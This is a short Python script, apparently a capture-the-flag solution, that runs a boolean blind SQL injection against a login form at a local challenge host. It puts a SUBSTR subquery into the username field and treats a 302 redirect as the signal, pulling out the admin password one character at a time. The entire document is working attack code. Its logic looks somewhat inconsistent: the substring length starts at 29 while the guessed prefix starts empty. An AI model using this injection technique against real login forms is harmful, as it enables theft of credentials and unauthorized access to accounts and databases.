import requests

charList = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~"
flag = ""

for i in range(60):
    for y in range(len(charList)):
        query = "admin' AND SUBSTR((SELECT Password FROM Users WHERE Username = 'admin'), 1, " + str(i + 29) + ") = '" + flag + charList[y] + "' --"

        url = "http://challenge.localhost/"
        payload = query  

        data = {
            "username": payload,
            "password": "1",
        }

        r = requests.post(url, data=data, allow_redirects=False)
        
        if r.status_code == 302:
            print("Status:", r.status_code)
            flag+= charList[y]
            print(flag)


